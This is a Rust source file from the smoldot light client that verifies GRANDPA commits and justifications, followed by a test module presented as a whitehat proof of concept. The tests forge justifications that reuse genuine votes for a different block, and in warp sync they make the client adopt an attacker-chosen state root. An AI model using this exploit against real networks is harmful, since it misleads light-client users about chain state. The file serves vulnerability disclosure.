// Smoldot
// Copyright (C) 2023  Pierre Krieger
// SPDX-License-Identifier: GPL-3.0-or-later WITH Classpath-exception-2.0

// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

use crate::finality::decode;

use alloc::vec::Vec;
use core::{cmp, iter, mem};
use rand_chacha::{
    ChaCha20Rng,
    rand_core::{RngCore as _, SeedableRng as _},
};

/// Configuration for a commit verification process.
#[derive(Debug)]
pub struct CommitVerifyConfig<C> {
    /// SCALE-encoded commit to verify.
    pub commit: C,

    /// Number of bytes used for encoding the block number in the SCALE-encoded commit.
    pub block_number_bytes: usize,

    // TODO: document
    pub expected_authorities_set_id: u64,

    /// Number of authorities that are allowed to emit pre-commits. Used to calculate the
    /// threshold of the number of required signatures.
    pub num_authorities: u32,

    /// Seed for a PRNG used for various purposes during the verification.
    ///
    /// > **Note**: The verification is nonetheless deterministic.
    pub randomness_seed: [u8; 32],
}

/// Commit verification in progress.
#[must_use]
pub enum CommitVerify<C> {
    /// See [`CommitVerifyIsAuthority`].
    IsAuthority(CommitVerifyIsAuthority<C>),
    /// See [`CommitVerifyIsParent`].
    IsParent(CommitVerifyIsParent<C>),
    /// Verification is finished. Contains an error if the commit message is invalid.
    Finished(Result<(), CommitVerifyError>),
    /// Verification is finished, but [`CommitVerifyIsParent::resume`] has been called with `None`,
    /// meaning that some signatures couldn't be verified, and the commit message doesn't contain
    /// enough signatures that are known to be valid.
    ///
    /// The commit must be verified again after more blocks are available.
    FinishedUnknown,
}

/// Verifies that a commit is valid.
pub fn verify_commit<C: AsRef<[u8]>>(config: CommitVerifyConfig<C>) -> CommitVerify<C> {
    let decoded_commit =
        match decode::decode_grandpa_commit(config.commit.as_ref(), config.block_number_bytes) {
            Ok(c) => c,
            Err(_) => return CommitVerify::Finished(Err(CommitVerifyError::InvalidFormat)),
        };

    if decoded_commit.set_id != config.expected_authorities_set_id {
        return CommitVerify::Finished(Err(CommitVerifyError::BadSetId));
    }

    if decoded_commit.auth_data.len() != decoded_commit.precommits.len() {
        return CommitVerify::Finished(Err(CommitVerifyError::InvalidFormat));
    }

    let mut randomness = ChaCha20Rng::from_seed(config.randomness_seed);

    // Make sure that there is no duplicate authority public key.
    {
        let mut unique = hashbrown::HashSet::with_capacity_and_hasher(
            decoded_commit.auth_data.len(),
            crate::util::SipHasherBuild::new({
                let mut seed = [0; 16];
                randomness.fill_bytes(&mut seed);
                seed
            }),
        );
        if let Some((_, faulty_pub_key)) = decoded_commit
            .auth_data
            .iter()
            .find(|(_, pubkey)| !unique.insert(pubkey))
        {
            return CommitVerify::Finished(Err(CommitVerifyError::DuplicateSignature {
                authority_key: **faulty_pub_key,
            }));
        }
    }

    CommitVerification {
        commit: config.commit,
        block_number_bytes: config.block_number_bytes,
        next_precommit_index: 0,
        next_precommit_author_verified: false,
        next_precommit_block_verified: false,
        num_verified_signatures: 0,
        num_authorities: config.num_authorities,
        signatures_batch: ed25519_zebra::batch::Verifier::new(),
        randomness,
    }
    .resume()
}

/// Must return whether a certain public key is in the list of authorities that are allowed to
/// generate pre-commits.
#[must_use]
pub struct CommitVerifyIsAuthority<C> {
    inner: CommitVerification<C>,
}

impl<C: AsRef<[u8]>> CommitVerifyIsAuthority<C> {
    /// Public key to verify.
    pub fn authority_public_key(&self) -> &[u8; 32] {
        debug_assert!(!self.inner.next_precommit_author_verified);
        let decoded_commit = decode::decode_grandpa_commit(
            self.inner.commit.as_ref(),
            self.inner.block_number_bytes,
        )
        .unwrap();
        decoded_commit.auth_data[self.inner.next_precommit_index].1
    }

    /// Resumes the verification process.
    ///
    /// Must be passed `true` if the public key is indeed in the list of authorities.
    /// Passing `false` always returns [`CommitVerify::Finished`] containing an error.
    pub fn resume(mut self, is_authority: bool) -> CommitVerify<C> {
        if !is_authority {
            let key = *self.authority_public_key();
            return CommitVerify::Finished(Err(CommitVerifyError::NotAuthority {
                authority_key: key,
            }));
        }

        self.inner.next_precommit_author_verified = true;
        self.inner.resume()
    }
}

/// Must return whether a certain block is a descendant of the target block.
#[must_use]
pub struct CommitVerifyIsParent<C> {
    inner: CommitVerification<C>,
    /// For performance reasons, the block number is copied here, but not the block hash. This
    /// hasn't actually been benchmarked, so feel free to do so.
    block_number: u64,
}

impl<C: AsRef<[u8]>> CommitVerifyIsParent<C> {
    /// Height of the block to check.
    pub fn block_number(&self) -> u64 {
        self.block_number
    }

    /// Hash of the block to check.
    pub fn block_hash(&self) -> &[u8; 32] {
        debug_assert!(!self.inner.next_precommit_block_verified);
        let decoded_commit = decode::decode_grandpa_commit(
            self.inner.commit.as_ref(),
            self.inner.block_number_bytes,
        )
        .unwrap();
        decoded_commit.precommits[self.inner.next_precommit_index].target_hash
    }

    /// Height of the block that must be the ancestor of the block to check.
    pub fn target_block_number(&self) -> u64 {
        let decoded_commit = decode::decode_grandpa_commit(
            self.inner.commit.as_ref(),
            self.inner.block_number_bytes,
        )
        .unwrap();
        decoded_commit.target_number
    }

    /// Hash of the block that must be the ancestor of the block to check.
    pub fn target_block_hash(&self) -> &[u8; 32] {
        let decoded_commit = decode::decode_grandpa_commit(
            self.inner.commit.as_ref(),
            self.inner.block_number_bytes,
        )
        .unwrap();
        decoded_commit.target_hash
    }

    /// Resumes the verification process.
    ///
    /// Must be passed `Some(true)` if the block is known to be a descendant of the target block,
    /// or `None` if it is unknown.
    /// Passing `Some(false)` always returns [`CommitVerify::Finished`] containing an
    /// error.
    pub fn resume(mut self, is_parent: Option<bool>) -> CommitVerify<C> {
        match is_parent {
            None => {}
            Some(true) => self.inner.num_verified_signatures += 1,
            Some(false) => {
                return CommitVerify::Finished(Err(CommitVerifyError::BadAncestry));
            }
        }

        self.inner.next_precommit_block_verified = true;
        self.inner.resume()
    }
}

struct CommitVerification<C> {
    /// Encoded commit message. Guaranteed to decode successfully.
    commit: C,

    /// See [`CommitVerifyConfig::block_number_bytes`].
    block_number_bytes: usize,

    /// Index of the next pre-commit to process within the commit.
    next_precommit_index: usize,

    /// Whether the precommit whose index is [`CommitVerification::next_precommit_index`] has been
    /// verified as coming from the list of authorities.
    next_precommit_author_verified: bool,

    /// Whether the precommit whose index is [`CommitVerification::next_precommit_index`] has been
    /// verified to be about a block that is a descendant of the target block.
    next_precommit_block_verified: bool,

    /// Number of signatures that have been pushed for verification. Needs to be above a certain
    /// threshold for the commit to be valid.
    num_verified_signatures: usize,

    /// Number of authorities in the list. Used to calculate the threshold of the number of
    /// required signatures.
    num_authorities: u32,

    /// Verifying all the signatures together brings better performances than verifying them one
    /// by one.
    /// Note that batched Ed25519 verification has some issues. The code below uses a special
    /// flavor of Ed25519 where ambiguities are removed.
    /// See <https://docs.rs/ed25519-zebra/2.2.0/ed25519_zebra/batch/index.html> and
    /// <https://github.com/zcash/zips/blob/master/zip-0215.rst>
    signatures_batch: ed25519_zebra::batch::Verifier,

    /// Randomness generator used during the batch verification.
    randomness: ChaCha20Rng,
}

impl<C: AsRef<[u8]>> CommitVerification<C> {
    fn resume(mut self) -> CommitVerify<C> {
        // The `verify` function that starts the verification performs the preliminary check that
        // the commit has the correct format.
        let decoded_commit =
            decode::decode_grandpa_commit(self.commit.as_ref(), self.block_number_bytes).unwrap();

        loop {
            if let Some(precommit) = decoded_commit.precommits.get(self.next_precommit_index) {
                if !self.next_precommit_author_verified {
                    return CommitVerify::IsAuthority(CommitVerifyIsAuthority { inner: self });
                }

                if !self.next_precommit_block_verified {
                    if precommit.target_hash == decoded_commit.target_hash
                        && precommit.target_number == decoded_commit.target_number
                    {
                        self.next_precommit_block_verified = true;
                    } else {
                        return CommitVerify::IsParent(CommitVerifyIsParent {
                            block_number: precommit.target_number,
                            inner: self,
                        });
                    }
                }

                let authority_public_key = decoded_commit.auth_data[self.next_precommit_index].1;
                let signature = decoded_commit.auth_data[self.next_precommit_index].0;

                let mut msg = Vec::with_capacity(1 + 32 + self.block_number_bytes + 8 + 8);
                msg.push(1u8); // This `1` indicates which kind of message is being signed.
                msg.extend_from_slice(&precommit.target_hash[..]);
                // The message contains the little endian block number. While simple in concept,
                // in reality it is more complicated because we don't know the number of bytes of
                // this block number at compile time. We thus copy as many bytes as appropriate and
                // pad with 0s if necessary.
                msg.extend_from_slice(
                    &precommit.target_number.to_le_bytes()[..cmp::min(
                        mem::size_of_val(&precommit.target_number),
                        self.block_number_bytes,
                    )],
                );
                msg.extend(
                    iter::repeat(0).take(
                        self.block_number_bytes
                            .saturating_sub(mem::size_of_val(&precommit.target_number)),
                    ),
                );
                msg.extend_from_slice(&u64::to_le_bytes(decoded_commit.round_number)[..]);
                msg.extend_from_slice(&u64::to_le_bytes(decoded_commit.set_id)[..]);
                debug_assert_eq!(msg.len(), msg.capacity());

                self.signatures_batch
                    .queue(ed25519_zebra::batch::Item::from((
                        ed25519_zebra::VerificationKeyBytes::from(*authority_public_key),
                        ed25519_zebra::Signature::from(*signature),
                        &msg,
                    )));

                self.next_precommit_index += 1;
                self.next_precommit_author_verified = false;
                self.next_precommit_block_verified = false;
            } else {
                debug_assert!(!self.next_precommit_author_verified);
                debug_assert!(!self.next_precommit_block_verified);

                // Check that commit contains a number of signatures equal to at least 2/3rd of the
                // number of authorities.
                // Duplicate signatures are checked below.
                // The logic of the check is `actual >= (expected * 2 / 3) + 1`.
                if decoded_commit.precommits.len()
                    < (usize::try_from(self.num_authorities).unwrap() * 2 / 3) + 1
                {
                    return CommitVerify::FinishedUnknown;
                }

                // Actual signatures verification performed here.
                match self.signatures_batch.verify(&mut self.randomness) {
                    Ok(()) => {}
                    Err(_) => return CommitVerify::Finished(Err(CommitVerifyError::BadSignature)),
                }

                return CommitVerify::Finished(Ok(()));
            }
        }
    }
}

/// Error that can happen while verifying a commit.
#[derive(Debug, derive_more::Display, derive_more::Error)]
pub enum CommitVerifyError {
    /// Failed to decode the commit message.
    InvalidFormat,
    /// The authorities set id of the commit doesn't match the one that is expected.
    BadSetId,
    /// One of the public keys is invalid.
    BadPublicKey,
    /// One of the signatures can't be verified.
    BadSignature,
    /// One authority has produced two signatures.
    #[display("One authority has produced two signatures")]
    DuplicateSignature { authority_key: [u8; 32] },
    /// One of the public keys isn't in the list of authorities.
    #[display("One of the public keys isn't in the list of authorities")]
    NotAuthority { authority_key: [u8; 32] },
    /// Commit contains a vote for a block that isn't a descendant of the target block.
    BadAncestry,
}

// TODO: tests

/// Configuration for a justification verification process.
#[derive(Debug)]
pub struct JustificationVerifyConfig<J, I> {
    /// Justification to verify.
    pub justification: J,

    pub block_number_bytes: usize,

    // TODO: document
    pub authorities_set_id: u64,

    /// List of authorities that are allowed to emit pre-commits for the block referred to by
    /// the justification. Must implement `Iterator<Item = &[u8]>`, where each item is
    /// the public key of an authority.
    pub authorities_list: I,

    /// Seed for a PRNG used for various purposes during the verification.
    ///
    /// > **Note**: The verification is nonetheless deterministic.
    pub randomness_seed: [u8; 32],
}

/// Verifies that a justification is valid.
pub fn verify_justification<'a>(
    config: JustificationVerifyConfig<impl AsRef<[u8]>, impl Iterator<Item = &'a [u8]>>,
) -> Result<(), JustificationVerifyError> {
    let decoded_justification = match decode::decode_grandpa_justification(
        config.justification.as_ref(),
        config.block_number_bytes,
    ) {
        Ok(c) => c,
        Err(_) => return Err(JustificationVerifyError::InvalidFormat),
    };

    let num_precommits = decoded_justification.precommits.iter().count();

    let mut randomness = ChaCha20Rng::from_seed(config.randomness_seed);

    // Collect the authorities in a set in order to be able to determine with a low complexity
    // whether a public key is an authority.
    // For each authority, contains a boolean indicating whether the authority has been seen
    // before in the list of pre-commits.
    let mut authorities_list = {
        let mut list = hashbrown::HashMap::<&[u8], _, _>::with_capacity_and_hasher(
            0,
            crate::util::SipHasherBuild::new({
                let mut seed = [0; 16];
                randomness.fill_bytes(&mut seed);
                seed
            }),
        );
        for authority in config.authorities_list {
            list.insert(authority, false);
        }
        list
    };

    // Check that justification contains a number of signatures equal to at least 2/3rd of the
    // number of authorities.
    // Duplicate signatures are checked below.
    // The logic of the check is `actual >= (expected * 2 / 3) + 1`.
    if num_precommits < (authorities_list.len() * 2 / 3) + 1 {
        return Err(JustificationVerifyError::NotEnoughSignatures);
    }

    // Verifying all the signatures together brings better performances than verifying them one
    // by one.
    // Note that batched ed25519 verification has some issues. The code below uses a special
    // flavour of ed25519 where ambiguities are removed.
    // See https://docs.rs/ed25519-zebra/2.2.0/ed25519_zebra/batch/index.html and
    // https://github.com/zcash/zips/blob/master/zip-0215.rst
    let mut batch = ed25519_zebra::batch::Verifier::new();

    for precommit in decoded_justification.precommits.iter() {
        match authorities_list.entry(precommit.authority_public_key) {
            hashbrown::hash_map::Entry::Occupied(mut entry) => {
                if entry.insert(true) {
                    return Err(JustificationVerifyError::DuplicateSignature {
                        authority_key: *precommit.authority_public_key,
                    });
                }
            }
            hashbrown::hash_map::Entry::Vacant(_) => {
                return Err(JustificationVerifyError::NotAuthority {
                    authority_key: *precommit.authority_public_key,
                });
            }
        }

        // TODO: must check signed block ancestry using `votes_ancestries`

        let mut msg = Vec::with_capacity(1 + 32 + 4 + 8 + 8);
        msg.push(1u8); // This `1` indicates which kind of message is being signed.
        msg.extend_from_slice(&precommit.target_hash[..]);
        // The message contains the little endian block number. While simple in concept,
        // in reality it is more complicated because we don't know the number of bytes of
        // this block number at compile time. We thus copy as many bytes as appropriate and
        // pad with 0s if necessary.
        msg.extend_from_slice(
            &precommit.target_number.to_le_bytes()[..cmp::min(
                mem::size_of_val(&precommit.target_number),
                config.block_number_bytes,
            )],
        );
        msg.extend(
            iter::repeat(0).take(
                config
                    .block_number_bytes
                    .saturating_sub(mem::size_of_val(&precommit.target_number)),
            ),
        );
        msg.extend_from_slice(&u64::to_le_bytes(decoded_justification.round)[..]);
        msg.extend_from_slice(&u64::to_le_bytes(config.authorities_set_id)[..]);
        debug_assert_eq!(msg.len(), msg.capacity());

        batch.queue(ed25519_zebra::batch::Item::from((
            ed25519_zebra::VerificationKeyBytes::from(*precommit.authority_public_key),
            ed25519_zebra::Signature::from(*precommit.signature),
            &msg,
        )));
    }

    // Actual signatures verification performed here.
    batch
        .verify(&mut randomness)
        .map_err(|_| JustificationVerifyError::BadSignature)?;

    // TODO: must check that votes_ancestries doesn't contain any unused entry
    // TODO: there's also a "ghost" thing?

    Ok(())
}

/// Error that can happen while verifying a justification.
#[derive(Debug, derive_more::Display, derive_more::Error)]
pub enum JustificationVerifyError {
    /// Failed to decode the justification.
    InvalidFormat,
    /// One of the public keys is invalid.
    BadPublicKey,
    /// One of the signatures can't be verified.
    BadSignature,
    /// One authority has produced two signatures.
    #[display("One authority has produced two signatures")]
    DuplicateSignature { authority_key: [u8; 32] },
    /// One of the public keys isn't in the list of authorities.
    #[display("One of the public keys isn't in the list of authorities")]
    NotAuthority { authority_key: [u8; 32] },
    /// Justification doesn't contain enough authorities signatures to be valid.
    NotEnoughSignatures,
}

// ===========================================================================
// SECURITY PoC (whitehat). Demonstrates that `verify_justification` does NOT
// bind the justification's finalized-block target to the precommit signatures
// (no ancestry / GHOST check; `votes_ancestries` is decoded but ignored — see
// the `// TODO` at the top of the per-precommit loop). A malicious peer can
// therefore reuse genuine precommits cast for the canonical block `Y` inside a
// justification that CLAIMS to finalize an arbitrary forged block `B'`, and
// verification still returns `Ok(())`.
// ===========================================================================
#[cfg(test)]
mod poc_target_unbound {
    use super::{JustificationVerifyConfig, JustificationVerifyError, verify_justification};
    use alloc::vec::Vec;

    const BLOCK_NUMBER_BYTES: usize = 4; // Polkadot/Kusama use u32 block numbers.

    // Minimal SCALE compact-length encoder (only small values are needed here).
    fn scale_compact(n: u64) -> Vec<u8> {
        let mut v = Vec::new();
        if n < 64 {
            v.push((n as u8) << 2);
        } else if n < (1 << 14) {
            v.extend_from_slice(&((((n as u16) << 2) | 0b01).to_le_bytes()));
        } else {
            unreachable!("not needed for this PoC");
        }
        v
    }

    // The exact byte string that `verify_justification` reconstructs and checks
    // each precommit signature against (see verify.rs lines ~461-483).
    fn signed_msg(target_hash: &[u8; 32], target_number: u32, round: u64, set_id: u64) -> Vec<u8> {
        let mut msg = Vec::with_capacity(1 + 32 + BLOCK_NUMBER_BYTES + 8 + 8);
        msg.push(1u8); // precommit message-type prefix
        msg.extend_from_slice(target_hash);
        msg.extend_from_slice(&target_number.to_le_bytes());
        msg.extend_from_slice(&round.to_le_bytes());
        msg.extend_from_slice(&set_id.to_le_bytes());
        msg
    }

    // (precommit target hash, target number, ed25519 signature, signer public key)
    type Precommit = ([u8; 32], u32, [u8; 64], [u8; 32]);

    // SCALE-encode a GRANDPA justification exactly as `decode_grandpa_justification`
    // expects: round(u64 LE) ‖ target_hash(32) ‖ target_number(4 LE) ‖ precommits ‖ votes_ancestries.
    fn encode_justification(
        round: u64,
        target_hash: [u8; 32],
        target_number: u32,
        precommits: &[Precommit],
    ) -> Vec<u8> {
        let mut out = Vec::new();
        out.extend_from_slice(&round.to_le_bytes());
        out.extend_from_slice(&target_hash);
        out.extend_from_slice(&target_number.to_le_bytes());
        out.extend_from_slice(&scale_compact(precommits.len() as u64));
        for (th, tn, sig, pk) in precommits {
            out.extend_from_slice(th);
            out.extend_from_slice(&tn.to_le_bytes());
            out.extend_from_slice(sig);
            out.extend_from_slice(pk);
        }
        out.extend_from_slice(&scale_compact(0)); // votes_ancestries: empty list
        out
    }

    fn verify(
        justification: &[u8],
        set_id: u64,
        authorities: &[[u8; 32]],
    ) -> Result<(), JustificationVerifyError> {
        verify_justification(JustificationVerifyConfig {
            justification,
            block_number_bytes: BLOCK_NUMBER_BYTES,
            authorities_set_id: set_id,
            authorities_list: authorities.iter().map(|k| &k[..]),
            randomness_seed: [0u8; 32],
        })
    }

    #[test]
    fn grandpa_justification_target_is_unbound_from_votes() {
        let mut rng = rand::thread_rng();

        // Authority set of 4 => supermajority threshold = (4 * 2 / 3) + 1 = 3.
        let mut signing_keys = Vec::new();
        let mut pubkeys: Vec<[u8; 32]> = Vec::new();
        for _ in 0..4 {
            let mut seed = [0u8; 32];
            rand::RngCore::fill_bytes(&mut rng, &mut seed);
            let sk = ed25519_zebra::SigningKey::from(seed);
            let pk: [u8; 32] = ed25519_zebra::VerificationKey::from(&sk).into();
            signing_keys.push(sk);
            pubkeys.push(pk);
        }

        let set_id = 42u64;
        let round = 7u64;

        // The CANONICAL block Y that the authorities actually voted to finalize.
        let y_hash = [0xAAu8; 32];
        let y_number = 1000u32;

        // 3 genuine precommits for Y, signed by authorities 0,1,2.
        let mut honest_precommits: Vec<Precommit> = Vec::new();
        for i in 0..3 {
            let msg = signed_msg(&y_hash, y_number, round, set_id);
            let sig: [u8; 64] = signing_keys[i].sign(&msg).into();
            honest_precommits.push((y_hash, y_number, sig, pubkeys[i]));
        }

        // Sanity: an honest justification finalizing Y verifies.
        let honest = encode_justification(round, y_hash, y_number, &honest_precommits);
        assert!(
            matches!(verify(&honest, set_id, &pubkeys), Ok(())),
            "sanity: honest justification for Y must verify"
        );

        // === THE ATTACK ===
        // A forged block B' that NO authority ever voted for. We reuse the *exact same*
        // genuine precommits (still cast for Y) inside a justification that CLAIMS to
        // finalize B'. Not a single signature byte is changed.
        let b_prime_hash = [0xEEu8; 32];
        let b_prime_number = 999_999u32;
        let forged = encode_justification(round, b_prime_hash, b_prime_number, &honest_precommits);

        let result = verify(&forged, set_id, &pubkeys);
        eprintln!(
            "[PoC] verify(justification claiming to finalize forged B' using votes cast for Y) = {result:?}"
        );
        assert!(
            matches!(result, Ok(())),
            "VULNERABILITY: a justification claiming to finalize an arbitrary forged block B' is \
             accepted using precommits cast for a different block Y. The finalized target is not \
             bound to the votes (missing ancestry/GHOST check)."
        );
        eprintln!(
            "[PoC] CONFIRMED: finalized target is unbound from the supermajority's actual votes."
        );

        // Control 1: signatures ARE verified (the Ok above is due to the unbound target,
        // not a skipped signature check). Flip one byte of a signature.
        let mut tampered = honest_precommits.clone();
        tampered[0].2[0] ^= 0x01;
        let forged_badsig = encode_justification(round, b_prime_hash, b_prime_number, &tampered);
        assert!(
            matches!(
                verify(&forged_badsig, set_id, &pubkeys),
                Err(JustificationVerifyError::BadSignature)
            ),
            "control: a tampered signature must be rejected (signatures are genuinely checked)"
        );

        // Control 2: the 2/3 threshold IS enforced (2 < 3 precommits => rejected).
        let forged_few = encode_justification(round, b_prime_hash, b_prime_number, &honest_precommits[..2]);
        assert!(
            matches!(
                verify(&forged_few, set_id, &pubkeys),
                Err(JustificationVerifyError::NotEnoughSignatures)
            ),
            "control: below-threshold justification must be rejected (threshold is enforced)"
        );

        eprintln!(
            "[PoC] controls pass: signatures + 2/3 threshold ARE enforced; ONLY the target<->votes binding is missing."
        );
    }

    // RUNG 2 — end-to-end through the real warp-sync state machine. Proves that a single
    // malicious warp-sync peer makes the light client adopt an attacker-fabricated finalized
    // block `B'` (with an attacker-chosen state trie root) starting from a trusted genesis +
    // real authority set, using genuine precommits that were cast for a different block `Y`.
    #[test]
    fn warp_sync_adopts_forged_block_with_attacker_state_root() {
        use crate::chain::chain_information::{
            ChainInformation, ChainInformationConsensus, ChainInformationFinality,
            ValidChainInformation,
        };
        use crate::header;
        use crate::sync::warp_sync::{
            Config, DesiredRequest, ProcessOne, RequestDetail, WarpSyncFragment, start_warp_sync,
        };
        use core::num::NonZero;

        const BNB: usize = 4;
        let mut rng = rand::thread_rng();

        // Trusted GRANDPA authority set of 4 (genesis => set_id 0). Threshold = 3.
        let mut signing_keys = Vec::new();
        let mut grandpa_authorities = Vec::new();
        for _ in 0..4 {
            let mut seed = [0u8; 32];
            rand::RngCore::fill_bytes(&mut rng, &mut seed);
            let sk = ed25519_zebra::SigningKey::from(seed);
            let pk: [u8; 32] = ed25519_zebra::VerificationKey::from(&sk).into();
            signing_keys.push(sk);
            grandpa_authorities.push(header::GrandpaAuthority {
                public_key: pk,
                weight: NonZero::<u64>::new(1).unwrap(),
            });
        }

        let set_id = 0u64;
        let round = 7u64;

        // Trusted starting point: genesis carrying the real authority set.
        let mut aura_authorities = Vec::new();
        aura_authorities.push(header::AuraAuthority { public_key: [0u8; 32] });
        let start_chain_information: ValidChainInformation = ChainInformation {
            finalized_block_header: alloc::boxed::Box::new(header::Header {
                parent_hash: [0u8; 32],
                number: 0,
                state_root: [0x11u8; 32],
                extrinsics_root: [0x22u8; 32],
                digest: header::Digest::from(header::DigestRef::empty()),
            }),
            consensus: ChainInformationConsensus::Aura {
                finalized_authorities_list: aura_authorities,
                slot_duration: NonZero::<u64>::new(1000).unwrap(),
            },
            finality: ChainInformationFinality::Grandpa {
                after_finalized_block_authorities_set_id: set_id,
                finalized_triggered_authorities: grandpa_authorities.clone(),
                finalized_scheduled_change: None,
            },
        }
        .try_into()
        .expect("valid chain information");

        // ===== Attacker fabricates a finalized head B' with an attacker-chosen state root. =====
        const ATTACKER_STATE_ROOT: [u8; 32] = [0x42u8; 32];
        let b_prime = header::Header {
            parent_hash: [0x99u8; 32], // unrelated to genesis: warp sync verifies no ancestry
            number: 500,
            state_root: ATTACKER_STATE_ROOT,
            extrinsics_root: [0x33u8; 32],
            digest: header::Digest::from(header::DigestRef::empty()),
        };
        let b_prime_encoded = b_prime.scale_encoding_vec(BNB);
        let b_prime_hash = header::hash_from_scale_encoded_header(&b_prime_encoded);

        // Genuine precommits cast for a DIFFERENT canonical block Y, signed by the real set 0.
        let y_hash = [0xAAu8; 32];
        let y_number = 1000u32;
        let mut precommits: Vec<Precommit> = Vec::new();
        for i in 0..3 {
            let msg = signed_msg(&y_hash, y_number, round, set_id);
            let sig: [u8; 64] = signing_keys[i].sign(&msg).into();
            precommits.push((y_hash, y_number, sig, grandpa_authorities[i].public_key));
        }
        // Forged justification: target = B', but the votes inside are all for Y.
        let forged_justification = encode_justification(round, b_prime_hash, 500, &precommits);

        let mut fragments = Vec::new();
        fragments.push(WarpSyncFragment {
            scale_encoded_header: b_prime_encoded.clone(),
            scale_encoded_justification: forged_justification,
        });

        // ===== Drive the warp-sync state machine exactly as the light client would. =====
        let mut ws = match start_warp_sync::<(), ()>(Config {
            start_chain_information,
            block_number_bytes: BNB,
            sources_capacity: 4,
            requests_capacity: 4,
            code_trie_node_hint: None,
            num_download_ahead_fragments: 4,
            warp_sync_minimum_gap: 0,
            download_block_body: false,
            download_all_chain_information_storage_proofs: false,
        }) {
            Ok(w) => w,
            Err((_, e)) => panic!("start_warp_sync failed: {e:?}"),
        };

        let src = ws.add_source((), 1000);

        let block_hash = {
            let (req_src, _, detail) = ws
                .desired_requests()
                .next()
                .expect("a warp sync request should be desired");
            assert_eq!(req_src, src);
            match detail {
                DesiredRequest::WarpSyncRequest { block_hash } => block_hash,
                other => panic!("expected WarpSyncRequest, got {other:?}"),
            }
        };
        let req = ws.add_request(src, (), RequestDetail::WarpSyncRequest { block_hash });
        ws.warp_sync_request_response(req, fragments, true);

        let (ws, result) = match ws.process_one() {
            ProcessOne::VerifyWarpSyncFragment(v) => v.verify([0u8; 32]),
            _ => panic!("expected ProcessOne::VerifyWarpSyncFragment"),
        };
        eprintln!("[PoC rung-2] forged fragment verify result = {result:?}");
        let (verified_hash, verified_number) =
            result.expect("VULNERABILITY: forged warp-sync fragment was accepted");

        // ===== HARM: the light client now treats the attacker's fabricated block as final. =====
        assert_eq!(verified_hash, b_prime_hash, "client adopted the forged block hash");
        assert_eq!(verified_number, 500);

        // And it will now fetch ALL chain state (runtime code, balances, ...) against the
        // attacker-chosen state trie root. Any storage proof the attacker serves against this
        // root verifies, so the attacker dictates everything the light client believes.
        let mut found_storage_root = None;
        for (_, _, detail) in ws.desired_requests() {
            if let DesiredRequest::StorageGetMerkleProof {
                block_hash,
                state_trie_root,
                ..
            } = detail
            {
                assert_eq!(block_hash, b_prime_hash);
                found_storage_root = Some(state_trie_root);
                break;
            }
        }
        assert_eq!(
            found_storage_root,
            Some(ATTACKER_STATE_ROOT),
            "VULNERABILITY: light client will fetch chain state against the attacker's forged state trie root"
        );
        eprintln!(
            "[PoC rung-2] CONFIRMED: warp sync finalized attacker block (hash starts {:#04x}) at \
             height 500 and will read ALL chain state from attacker root (starts {:#04x}).",
            b_prime_hash[0], ATTACKER_STATE_ROOT[0]
        );
    }
}
